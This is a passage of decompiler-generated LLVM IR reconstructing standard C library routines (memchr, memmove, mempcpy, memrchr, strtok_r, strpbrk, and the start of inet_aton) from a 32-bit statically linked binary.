  %v5_8055422 = inttoptr i32 %v0_8055422 to i16*
  %v5_8055423 = call i32 @__stdio_READ(i16* %v5_8055422, i32 %v2_805541d, i32 1)
  %v1_805542b = icmp eq i32 %v5_8055423, 0
  br i1 %v1_805542b, label %dec_label_pc_8055436, label %dec_label_pc_805542f

dec_label_pc_805542f:                             ; preds = %dec_label_pc_805541a
  %v3_805542f = load i8, i8* %stack_var_-5, align 1
  %v4_805542f = sext i8 %v3_805542f to i32
  store i32 %v4_805542f, i32* @edx, align 4
  br label %dec_label_pc_8055439

dec_label_pc_8055436:                             ; preds = %dec_label_pc_805541a, %dec_label_pc_80553f5, %dec_label_pc_8055387, %dec_label_pc_80553d0
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8055439

dec_label_pc_8055439:                             ; preds = %dec_label_pc_805542f, %dec_label_pc_8055411, %dec_label_pc_80553a9, %dec_label_pc_8055436
  %v0_8055439 = phi i32 [ %v4_805542f, %dec_label_pc_805542f ], [ %v0_8055439.pre, %dec_label_pc_8055411 ], [ %v1_80553bd, %dec_label_pc_80553a9 ], [ -1, %dec_label_pc_8055436 ]
  store i32 %v0_8055364, i32* @ebx, align 4
  ret i32 %v0_8055439

; uselistorder directives
  uselistorder i32 %v0_8055411, { 1, 0 }
  uselistorder i32 %v3_80553ed, { 1, 0 }
  uselistorder i32 %v0_8055422, { 0, 1, 3, 2 }
  uselistorder i8 %v3_80553d8, { 1, 0 }
  uselistorder i32 %v3_80553c2, { 1, 0, 2 }
  uselistorder i32 %v1_80553bd, { 1, 0 }
  uselistorder i32 %v2_805539f, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_80553d3, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055439, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055436, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055411, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80553ed, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8055440 = load i32, i32* @edi, align 4
  store i32 %v0_8055440, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8055447 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055447, i32* %edi.global-to-local, align 4
  %v1_805544f = icmp eq i32 %arg3, 0
  store i1 %v1_805544f, i1* %zf.global-to-local, align 1
  br i1 %v1_805544f, label %dec_label_pc_805545f, label %dec_label_pc_8055453

dec_label_pc_8055453:                             ; preds = %entry
  %v2_8055453 = call i32 @_strlen(i8* %arg1)
  %v3_8055453 = mul i32 %v2_8055453, -1
  %v4_8055453 = add i32 %v3_8055453, -2
  store i32 %v4_8055453, i32* @ecx, align 4
  %v0_8055455 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055455, label %dec_label_pc_8055453.dec_label_pc_805545c_crit_edge, label %dec_label_pc_8055457

dec_label_pc_8055453.dec_label_pc_805545c_crit_edge: ; preds = %dec_label_pc_8055453
  %v0_805545c.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_805545c.pre, -1
  br label %dec_label_pc_805545c

dec_label_pc_8055457:                             ; preds = %dec_label_pc_8055453
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805545c

dec_label_pc_805545c:                             ; preds = %dec_label_pc_8055453.dec_label_pc_805545c_crit_edge, %dec_label_pc_8055457
  %v0_805545c = phi i32 [ %phitmp, %dec_label_pc_8055453.dec_label_pc_805545c_crit_edge ], [ 0, %dec_label_pc_8055457 ]
  %v8_805545c = icmp eq i32 %v0_805545c, 0
  store i1 %v8_805545c, i1* %zf.global-to-local, align 1
  store i32 %v0_805545c, i32* %edi.global-to-local, align 4
  %v2_8055461.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805545f

dec_label_pc_805545f:                             ; preds = %entry, %dec_label_pc_805545c
  %v2_8055461 = phi i32 [ %v0_8055440, %entry ], [ %v2_8055461.pre, %dec_label_pc_805545c ]
  %v0_805545f = phi i32 [ 0, %entry ], [ %v0_805545c, %dec_label_pc_805545c ]
  store i32 %v2_8055461, i32* @edi, align 4
  ret i32 %v0_805545f

; uselistorder directives
  uselistorder i32 %v0_805545c, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805545f, { 1, 0 }
  uselistorder label %dec_label_pc_805545c, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8055465 = load i32, i32* @esi, align 4
  store i32 %v0_8055465, i32* %stack_var_-8, align 4
  %v4_8055466 = ptrtoint i8* %arg1 to i32
  %v9_8055472 = icmp ugt i8* %tmp3, %arg1
  %v1_8055474 = icmp eq i1 %v9_8055472, false
  br i1 %v1_8055474, label %dec_label_pc_805547c, label %dec_label_pc_8055476

dec_label_pc_8055476:                             ; preds = %entry
  %v7_8055478 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8055488

dec_label_pc_805547c:                             ; preds = %entry
  %v3_805547c = add i32 %arg2, -1
  %v4_805547c = add i32 %v3_805547c, %tmp
  %v5_805547c = inttoptr i32 %v4_805547c to i8*
  %v3_8055480 = add i32 %v4_8055466, -1
  %v4_8055480 = add i32 %v3_8055480, %tmp
  %v5_8055480 = inttoptr i32 %v4_8055480 to i8*
  %v7_8055485 = call i8* @_memcpy(i8* %v5_8055480, i8* %v5_805547c, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8055488

dec_label_pc_8055488:                             ; preds = %dec_label_pc_8055476, %dec_label_pc_805547c
  %v2_8055488 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055488, i32* @esi, align 4
  ret i32 %v4_8055466

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055488, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805548c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_805549f = inttoptr i32 %arg1 to i16*
  %v4_805549f = call i32 @memcpy(i16* %v3_805549f, i32 %arg2, i32 %arg3)
  %v0_80554a4 = load i32, i32* @esi, align 4
  %v2_80554a4 = add i32 %v0_80554a4, %arg3
  store i32 %v0_805548c, i32* @esi, align 4
  ret i32 %v2_80554a4
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_80554b5 = urem i32 %arg2, 256
  %v4_80554c1 = sext i8 %arg1 to i32
  %v2_80554c5 = add i32 %v4_80554c1, %arg3
  %v1_80554d77 = icmp eq i32 %arg3, 0
  br i1 %v1_80554d77, label %dec_label_pc_80554df, label %dec_label_pc_80554db

dec_label_pc_80554c9:                             ; preds = %dec_label_pc_80554db
  %v1_80554c9 = add i32 %v0_80554c9, -1
  %v5_80554ca = load i32, i32* @edx, align 4
  %v6_80554ca = and i32 %v5_80554ca, -256
  %v7_80554ca = or i32 %v6_80554ca, %v4_80554b5
  store i32 %v7_80554ca, i32* @edx, align 4
  %v1_80554ce = inttoptr i32 %v1_80554c9 to i8*
  %v2_80554ce = load i8, i8* %v1_80554ce, align 1
  %v15_80554ce = icmp eq i8 %v2_80554ce, %tmp
  br i1 %v15_80554ce, label %dec_label_pc_805555c, label %dec_label_pc_80554d6

dec_label_pc_80554d6:                             ; preds = %dec_label_pc_80554c9
  %v1_80554d6 = add i32 %v0_80554d6, -1
  %v8_80554d6 = icmp eq i32 %v1_80554d6, 0
  br i1 %v8_80554d6, label %dec_label_pc_80554df, label %dec_label_pc_80554db

dec_label_pc_80554db:                             ; preds = %entry, %dec_label_pc_80554d6
  %v0_80554d6 = phi i32 [ %v1_80554d6, %dec_label_pc_80554d6 ], [ %arg3, %entry ]
  %v0_80554c9 = phi i32 [ %v1_80554c9, %dec_label_pc_80554d6 ], [ %v2_80554c5, %entry ]
  %v2_80554db = urem i32 %v0_80554c9, 4
  %v3_80554db = icmp eq i32 %v2_80554db, 0
  %v1_80554dd = icmp eq i1 %v3_80554db, false
  br i1 %v1_80554dd, label %dec_label_pc_80554c9, label %dec_label_pc_80554df

dec_label_pc_80554df:                             ; preds = %dec_label_pc_80554d6, %dec_label_pc_80554db, %entry
  %v0_8055542.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80554d6 ], [ %v0_80554d6, %dec_label_pc_80554db ]
  %v0_80554e4 = phi i32 [ %v2_80554c5, %entry ], [ %v1_80554c9, %dec_label_pc_80554d6 ], [ %v0_80554c9, %dec_label_pc_80554db ]
  store i32 %v0_80554e4, i32* @ecx, align 4
  %v2_80554e8 = mul nuw nsw i32 %v4_80554b5, 256
  %v2_80554eb = or i32 %v2_80554e8, %v4_80554b5
  %v2_80554ef = mul i32 %v2_80554eb, 65536
  %v2_80554f2 = or i32 %v2_80554ef, %v2_80554eb
  %v6_805554550 = icmp ugt i32 %v0_8055542.pr, 3
  br i1 %v6_805554550, label %dec_label_pc_80554f6, label %dec_label_pc_8055547

dec_label_pc_80554f6:                             ; preds = %dec_label_pc_80554df, %dec_label_pc_805553f
  %v0_805553f52 = phi i32 [ %v1_805553f, %dec_label_pc_805553f ], [ %v0_8055542.pr, %dec_label_pc_80554df ]
  %v0_80554f651 = phi i32 [ %v1_80554f6, %dec_label_pc_805553f ], [ %v0_80554e4, %dec_label_pc_80554df ]
  %v1_80554f6 = add i32 %v0_80554f651, -4
  store i32 %v1_80554f6, i32* @ecx, align 4
  %v2_80554fb = inttoptr i32 %v1_80554f6 to i32*
  %v3_80554fb = load i32, i32* %v2_80554fb, align 4
  %v4_80554fb = xor i32 %v3_80554fb, %v2_80554f2
  %v1_80554fd = add i32 %v4_80554fb, 2130640639
  %v1_8055503 = sub i32 -1, %v4_80554fb
  %v2_8055505 = xor i32 %v1_80554fd, %v1_8055503
  %v1_8055507 = and i32 %v2_8055505, -2130640640
  %v2_8055507 = icmp eq i32 %v1_8055507, 0
  br i1 %v2_8055507, label %dec_label_pc_805553f, label %dec_label_pc_805550f

dec_label_pc_805550f:                             ; preds = %dec_label_pc_80554f6
  %v7_805550f = or i32 %v1_8055507, %v4_80554b5
  %v1_8055513 = add i32 %v0_80554f651, -1
  %v2_8055516 = inttoptr i32 %v1_8055513 to i8*
  %v3_8055516 = load i8, i8* %v2_8055516, align 1
  %v16_8055516 = icmp eq i8 %v3_8055516, %tmp
  br i1 %v16_8055516, label %dec_label_pc_805555c, label %dec_label_pc_805551b

dec_label_pc_805551b:                             ; preds = %dec_label_pc_805550f
  %v1_805551f = add i32 %v0_80554f651, -2
  %v2_8055522 = inttoptr i32 %v1_805551f to i8*
  %v3_8055522 = load i8, i8* %v2_8055522, align 1
  %v16_8055522 = icmp eq i8 %v3_8055522, %tmp
  br i1 %v16_8055522, label %dec_label_pc_805555c, label %dec_label_pc_8055527

dec_label_pc_8055527:                             ; preds = %dec_label_pc_805551b
  %v1_805552b = add i32 %v0_80554f651, -3
  %v2_805552e = inttoptr i32 %v1_805552b to i8*
  %v3_805552e = load i8, i8* %v2_805552e, align 1
  %v16_805552e = icmp eq i8 %v3_805552e, %tmp
  br i1 %v16_805552e, label %dec_label_pc_805555c, label %dec_label_pc_8055533

dec_label_pc_8055533:                             ; preds = %dec_label_pc_8055527
  %v1_8055537 = inttoptr i32 %v1_80554f6 to i8*
  %v2_8055537 = load i8, i8* %v1_8055537, align 1
  %v15_8055537 = icmp eq i8 %v2_8055537, %tmp
  %v1_8055539 = icmp eq i1 %v15_8055537, false
  br i1 %v1_8055539, label %dec_label_pc_805553f, label %dec_label_pc_805553b

dec_label_pc_805553b:                             ; preds = %dec_label_pc_8055533
  br label %dec_label_pc_805555c

dec_label_pc_805553f:                             ; preds = %dec_label_pc_8055533, %dec_label_pc_80554f6
  %v5_805554c27 = phi i32 [ %v7_805550f, %dec_label_pc_8055533 ], [ 0, %dec_label_pc_80554f6 ]
  %v1_805553f = add i32 %v0_805553f52, -4
  %v6_8055545 = icmp ugt i32 %v1_805553f, 3
  br i1 %v6_8055545, label %dec_label_pc_80554f6, label %dec_label_pc_8055547

dec_label_pc_8055547:                             ; preds = %dec_label_pc_805553f, %dec_label_pc_80554df
  %v5_805554c26.lcssa = phi i32 [ %v4_80554b5, %dec_label_pc_80554df ], [ %v5_805554c27, %dec_label_pc_805553f ]
  %v0_80554f6.lcssa = phi i32 [ %v0_80554e4, %dec_label_pc_80554df ], [ %v1_80554f6, %dec_label_pc_805553f ]
  %v0_805553f.lcssa = phi i32 [ %v0_8055542.pr, %dec_label_pc_80554df ], [ %v1_805553f, %dec_label_pc_805553f ]
  br label %dec_label_pc_8055554

dec_label_pc_805554b:                             ; preds = %dec_label_pc_8055554
  %v1_8055554 = add i32 %v0_8055554, -1
  %v1_805554b = add i32 %v0_805554b, -1
  %v6_805554c = and i32 %v5_805554c, -256
  %v7_805554c = or i32 %v6_805554c, %v4_80554b5
  %v1_8055550 = inttoptr i32 %v1_805554b to i8*
  %v2_8055550 = load i8, i8* %v1_8055550, align 1
  %v15_8055550 = icmp eq i8 %v2_8055550, %tmp
  br i1 %v15_8055550, label %dec_label_pc_805555c, label %dec_label_pc_8055554

dec_label_pc_8055554:                             ; preds = %dec_label_pc_805554b, %dec_label_pc_8055547
  %v5_805554c = phi i32 [ %v7_805554c, %dec_label_pc_805554b ], [ %v5_805554c26.lcssa, %dec_label_pc_8055547 ]
  %v0_805554b = phi i32 [ %v1_805554b, %dec_label_pc_805554b ], [ %v0_80554f6.lcssa, %dec_label_pc_8055547 ]
  %v0_8055554 = phi i32 [ %v1_8055554, %dec_label_pc_805554b ], [ %v0_805553f.lcssa, %dec_label_pc_8055547 ]
  %v10_8055555 = icmp eq i32 %v0_8055554, 0
  %v1_8055558 = icmp eq i1 %v10_8055555, false
  br i1 %v1_8055558, label %dec_label_pc_805554b, label %dec_label_pc_805555a

dec_label_pc_805555a:                             ; preds = %dec_label_pc_8055554
  br label %dec_label_pc_805555c

dec_label_pc_805555c:                             ; preds = %dec_label_pc_80554c9, %dec_label_pc_8055527, %dec_label_pc_805551b, %dec_label_pc_805550f, %dec_label_pc_805554b, %dec_label_pc_805553b, %dec_label_pc_805555a
  %v0_805555f = phi i32 [ %v1_80554f6, %dec_label_pc_805553b ], [ 0, %dec_label_pc_805555a ], [ %v1_805554b, %dec_label_pc_805554b ], [ %v1_805552b, %dec_label_pc_8055527 ], [ %v1_805551f, %dec_label_pc_805551b ], [ %v1_8055513, %dec_label_pc_805550f ], [ %v1_80554c9, %dec_label_pc_80554c9 ]
  ret i32 %v0_805555f

; uselistorder directives
  uselistorder i32 %v0_8055554, { 1, 0 }
  uselistorder i32 %v1_805553f, { 0, 2, 1 }
  uselistorder i32 %v1_80554f6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_80554f651, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80554eb, { 1, 0 }
  uselistorder i32 %v0_80554c9, { 1, 0, 2 }
  uselistorder i32 %v2_80554c5, { 1, 0 }
  uselistorder i32 %v4_80554b5, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 7, 0, 16, 17, 1, 15, 19, 14, 20, 3, 5, 4, 21, 8, 9, 10, 18, 11, 12, 6, 13 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805555c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80554f6, { 1, 0 }
  uselistorder label %dec_label_pc_80554df, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80554db, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055560 = load i32, i32* @edi, align 4
  %v0_8055561 = load i32, i32* @esi, align 4
  %v0_8055562 = load i32, i32* @ebx, align 4
  store i32 %v0_8055562, i32* %stack_var_-12, align 4
  %v4_8055563 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055563, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805556f = icmp eq i8* %arg1, null
  %v1_8055571 = icmp eq i1 %v1_805556f, false
  br i1 %v1_8055571, label %dec_label_pc_8055575, label %dec_label_pc_8055573

dec_label_pc_8055573:                             ; preds = %entry
  %v1_8055573 = inttoptr i32 %arg3 to i32*
  %v2_8055573 = load i32, i32* %v1_8055573, align 4
  store i32 %v2_8055573, i32* @ebx, align 4
  br label %dec_label_pc_8055575

dec_label_pc_8055575:                             ; preds = %entry, %dec_label_pc_8055573
  %v0_8055578 = phi i32 [ %v4_8055563, %entry ], [ %v2_8055573, %dec_label_pc_8055573 ]
  %v0_8055575 = load i32, i32* @ecx, align 4
  %v5_8055578 = inttoptr i32 %v0_8055578 to i8*
  %v8_8055579 = call i32 @__GI_strspn(i8* %v5_8055578, i32 %arg2, i32 %v0_8055575, i32 %v0_8055575)
  store i32 %v8_8055579, i32* %eax.global-to-local, align 4
  %v0_8055581 = load i32, i32* @ebx, align 4
  %v2_8055581 = add i32 %v0_8055581, %v8_8055579
  store i32 %v2_8055581, i32* @ebx, align 4
  %v1_8055583 = inttoptr i32 %v2_8055581 to i8*
  %v2_8055583 = load i8, i8* %v1_8055583, align 1
  %v3_8055583 = icmp eq i8 %v2_8055583, 0
  %v1_8055586 = icmp eq i1 %v3_8055583, false
  br i1 %v1_8055586, label %dec_label_pc_805558e, label %dec_label_pc_8055588

dec_label_pc_8055588:                             ; preds = %dec_label_pc_8055575
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805558a = load i32, i32* @esi, align 4
  %v2_805558a = inttoptr i32 %v1_805558a to i32*
  store i32 %v2_8055581, i32* %v2_805558a, align 4
  %v0_80555b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80555b5

dec_label_pc_805558e:                             ; preds = %dec_label_pc_8055575
  %v0_805558e = load i32, i32* @edx, align 4
  %v0_8055590 = load i32, i32* @edi, align 4
  %v8_8055592 = call i32 @__GI_strpbrk(i8* %v1_8055583, i32 %v0_8055590, i32 %v0_805558e, i32 %v0_805558e)
  store i32 %v8_8055592, i32* %eax.global-to-local, align 4
  %v2_805559a = icmp eq i32 %v8_8055592, 0
  %v1_805559c = icmp eq i1 %v2_805559a, false
  br i1 %v1_805559c, label %dec_label_pc_80555ad, label %dec_label_pc_805559e

dec_label_pc_805559e:                             ; preds = %dec_label_pc_805558e
  %v0_80555a2 = load i32, i32* @ebx, align 4
  %v5_80555a2 = inttoptr i32 %v0_80555a2 to i8*
  %v8_80555a3 = call i32 @rawmemchr(i8* %v5_80555a2, i32 0, i32 %v8_8055592, i32 %v8_8055592)
  br label %dec_label_pc_80555b1

dec_label_pc_80555ad:                             ; preds = %dec_label_pc_805558e
  %v9_8055592 = inttoptr i32 %v8_8055592 to i8*
  store i8 0, i8* %v9_8055592, align 1
  %v2_80555b0 = add i32 %v8_8055592, 1
  br label %dec_label_pc_80555b1

dec_label_pc_80555b1:                             ; preds = %dec_label_pc_805559e, %dec_label_pc_80555ad
  %storemerge = phi i32 [ %v2_80555b0, %dec_label_pc_80555ad ], [ %v8_80555a3, %dec_label_pc_805559e ]
  %v0_80555b1 = phi i32 [ %v2_80555b0, %dec_label_pc_80555ad ], [ %v8_80555a3, %dec_label_pc_805559e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80555b1 = load i32, i32* @esi, align 4
  %v2_80555b1 = inttoptr i32 %v1_80555b1 to i32*
  store i32 %v0_80555b1, i32* %v2_80555b1, align 4
  %v0_80555b3 = load i32, i32* @ebx, align 4
  store i32 %v0_80555b3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80555b5

dec_label_pc_80555b5:                             ; preds = %dec_label_pc_8055588, %dec_label_pc_80555b1
  %v0_80555b8 = phi i32 [ %v0_80555b8.pre, %dec_label_pc_8055588 ], [ %v0_80555b3, %dec_label_pc_80555b1 ]
  %v2_80555b5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80555b5, i32* @ebx, align 4
  store i32 %v0_8055561, i32* @esi, align 4
  store i32 %v0_8055560, i32* @edi, align 4
  ret i32 %v0_80555b8

; uselistorder directives
  uselistorder i32 %v8_8055592, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80555b5, { 1, 0 }
  uselistorder label %dec_label_pc_80555b1, { 1, 0 }
  uselistorder label %dec_label_pc_8055575, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80555bd = load i32, i32* @ebx, align 4
  %v2_80555d424 = load i8, i8* %arg1, align 1
  %v4_80555d628 = icmp eq i8 %v2_80555d424, 0
  br i1 %v4_80555d628, label %dec_label_pc_80555de, label %dec_label_pc_80555da.lr.ph

dec_label_pc_80555da.lr.ph:                       ; preds = %entry
  %v3_80555d425 = zext i8 %v2_80555d424 to i32
  %v5_80555d426 = and i32 %v0_80555bd, -256
  %v6_80555d427 = or i32 %v3_80555d425, %v5_80555d426
  %v4_80555c2 = ptrtoint i8* %arg1 to i32
  %v1_80555cd13 = inttoptr i32 %arg2 to i8*
  %v4_80555cd.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80555da

dec_label_pc_80555c8:                             ; preds = %dec_label_pc_80555da, %dec_label_pc_80555cc
  %v6_80555cd22 = phi i32 [ %v6_80555cd, %dec_label_pc_80555cc ], [ %v6_80555cd17, %dec_label_pc_80555da ]
  %v2_80555cd21 = phi i8 [ %v2_80555cd, %dec_label_pc_80555cc ], [ %v2_80555cd14, %dec_label_pc_80555da ]
  %v0_80555cc20 = phi i32 [ %v1_80555cc, %dec_label_pc_80555cc ], [ %arg2, %dec_label_pc_80555da ]
  %v15_80555c8 = icmp eq i8 %v2_80555cd21, %v2_80555d431
  br i1 %v15_80555c8, label %dec_label_pc_80555e0, label %dec_label_pc_80555cc

dec_label_pc_80555cc:                             ; preds = %dec_label_pc_80555c8
  %v1_80555cc = add i32 %v0_80555cc20, 1
  store i32 %v1_80555cc, i32* @edx, align 4
  %v1_80555cd = inttoptr i32 %v1_80555cc to i8*
  %v2_80555cd = load i8, i8* %v1_80555cd, align 1
  %v3_80555cd = zext i8 %v2_80555cd to i32
  %v5_80555cd = and i32 %v6_80555cd22, -256
  %v6_80555cd = or i32 %v3_80555cd, %v5_80555cd
  store i32 %v6_80555cd, i32* @ecx, align 4
  %v4_80555cf = icmp eq i8 %v2_80555cd, 0
  %v1_80555d1 = icmp eq i1 %v4_80555cf, false
  br i1 %v1_80555d1, label %dec_label_pc_80555c8, label %dec_label_pc_80555d3

dec_label_pc_80555d3:                             ; preds = %dec_label_pc_80555cc, %dec_label_pc_80555da
  %v4_80555cd.pre34 = phi i32 [ %v6_80555cd17, %dec_label_pc_80555da ], [ %v6_80555cd, %dec_label_pc_80555cc ]
  %v1_80555d3 = add i32 %v0_80555d329, 1
  %v1_80555d4 = inttoptr i32 %v1_80555d3 to i8*
  %v2_80555d4 = load i8, i8* %v1_80555d4, align 1
  %v3_80555d4 = zext i8 %v2_80555d4 to i32
  %v5_80555d4 = and i32 %v6_80555d432, -256
  %v6_80555d4 = or i32 %v3_80555d4, %v5_80555d4
  %v4_80555d6 = icmp eq i8 %v2_80555d4, 0
  br i1 %v4_80555d6, label %dec_label_pc_80555de, label %dec_label_pc_80555da

dec_label_pc_80555da:                             ; preds = %dec_label_pc_80555da.lr.ph, %dec_label_pc_80555d3
  %v4_80555cd.pre = phi i32 [ %v4_80555cd.pre.pre, %dec_label_pc_80555da.lr.ph ], [ %v4_80555cd.pre34, %dec_label_pc_80555d3 ]
  %v6_80555d432 = phi i32 [ %v6_80555d427, %dec_label_pc_80555da.lr.ph ], [ %v6_80555d4, %dec_label_pc_80555d3 ]
  %v2_80555d431 = phi i8 [ %v2_80555d424, %dec_label_pc_80555da.lr.ph ], [ %v2_80555d4, %dec_label_pc_80555d3 ]
  %v0_80555d329 = phi i32 [ %v4_80555c2, %dec_label_pc_80555da.lr.ph ], [ %v1_80555d3, %dec_label_pc_80555d3 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80555cd14 = load i8, i8* %v1_80555cd13, align 1
  %v3_80555cd15 = zext i8 %v2_80555cd14 to i32
  %v5_80555cd16 = and i32 %v4_80555cd.pre, -256
  %v6_80555cd17 = or i32 %v3_80555cd15, %v5_80555cd16
  store i32 %v6_80555cd17, i32* @ecx, align 4
  %v4_80555cf18 = icmp eq i8 %v2_80555cd14, 0
  %v1_80555d119 = icmp eq i1 %v4_80555cf18, false
  br i1 %v1_80555d119, label %dec_label_pc_80555c8, label %dec_label_pc_80555d3

dec_label_pc_80555de:                             ; preds = %dec_label_pc_80555d3, %entry
  br label %dec_label_pc_80555e0

dec_label_pc_80555e0:                             ; preds = %dec_label_pc_80555c8, %dec_label_pc_80555de
  %v0_80555e2 = phi i32 [ 0, %dec_label_pc_80555de ], [ %v0_80555d329, %dec_label_pc_80555c8 ]
  store i32 %v0_80555bd, i32* @ebx, align 4
  ret i32 %v0_80555e2

; uselistorder directives
  uselistorder i32 %v6_80555cd17, { 2, 0, 1 }
  uselistorder i8 %v2_80555cd14, { 1, 2, 0 }
  uselistorder i32 %v1_80555d3, { 1, 0 }
  uselistorder i32 %v6_80555cd, { 1, 2, 0 }
  uselistorder i8 %v2_80555cd, { 1, 2, 0 }
  uselistorder i32 %v1_80555cc, { 2, 1, 0 }
  uselistorder i8 %v2_80555d424, { 0, 2, 1 }
  uselistorder i32 %v0_80555bd, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80555e0, { 1, 0 }
  uselistorder label %dec_label_pc_80555da, { 1, 0 }
  uselistorder label %dec_label_pc_80555d3, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80555eb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80555eb, i32* @ecx, align 4
  %v1_80555ef = icmp eq i8* %arg1, null
  br i1 %v1_80555ef, label %dec_label_pc_8055670, label %dec_label_pc_80555f3

dec_label_pc_80555f3:                             ; preds = %entry
  %v0_8055601.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_80555fe

dec_label_pc_80555fe:                             ; preds = %dec_label_pc_80555f3, %dec_label_pc_8055647
  %v2_805564a35 = phi i32 [ 1, %dec_label_pc_80555f3 ], [ %v3_805564a, %dec_label_pc_8055647 ]
  %v0_80555fe34 = phi i32 [ %v4_80555eb, %dec_label_pc_80555f3 ], [ %v0_80555fe3, %dec_label_pc_8055647 ]
  %v0_805566533 = phi i32 [ 0, %dec_label_pc_80555f3 ], [ %v2_805564d, %dec_label_pc_8055647 ]
  %v1_80555fe = inttoptr i32 %v0_80555fe34 to i8*
  %v2_80555fe = load i8, i8* %v1_80555fe, align 1
  %v3_80555fe = sext i8 %v2_80555fe to i32
  %v2_8055607 = mul nsw i32 %v3_80555fe, 2
  %v3_8055607 = add i32 %v2_8055607, %v0_8055601.pre
  %v4_8055607 = inttoptr i32 %v3_8055607 to i8*
  %v5_8055607 = load i8, i8* %v4_8055607, align 1
  %v6_8055607 = and i8 %v5_8055607, 8
  %v7_8055607 = icmp eq i8 %v6_8055607, 0
  br i1 %v7_8055607, label %dec_label_pc_8055670, label %dec_label_pc_805560e

dec_label_pc_805560e:                             ; preds = %dec_label_pc_80555fe
  %v4_8055622.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055622

dec_label_pc_8055612:                             ; preds = %dec_label_pc_8055622
  %v3_8055612 = mul i32 %v1_8055612, 10
  %v2_8055615 = add i32 %v3_8055612, -48
  %v3_8055615 = add i32 %v2_8055615, %v2_8055624
  %v1_8055619 = add i32 %v3_8055615, -255
  %v6_8055619 = sub i32 254, %v3_8055615
  %v7_8055619 = and i32 %v6_8055619, %v3_8055615
  %v8_8055619 = icmp slt i32 %v7_8055619, 0
  %v9_8055619 = icmp eq i32 %v1_8055619, 0
  %v10_8055619 = icmp slt i32 %v1_8055619, 0
  %v3_805561f = icmp eq i1 %v10_8055619, %v8_8055619
  %v4_805561f = icmp eq i1 %v9_8055619, false
  %v5_805561f = and i1 %v4_805561f, %v3_805561f
  br i1 %v5_805561f, label %dec_label_pc_8055670, label %dec_label_pc_8055621

dec_label_pc_8055621:                             ; preds = %dec_label_pc_8055612
  %v1_8055621 = add i32 %v0_8055621, 1
  store i32 %v1_8055621, i32* @ecx, align 4
  br label %dec_label_pc_8055622

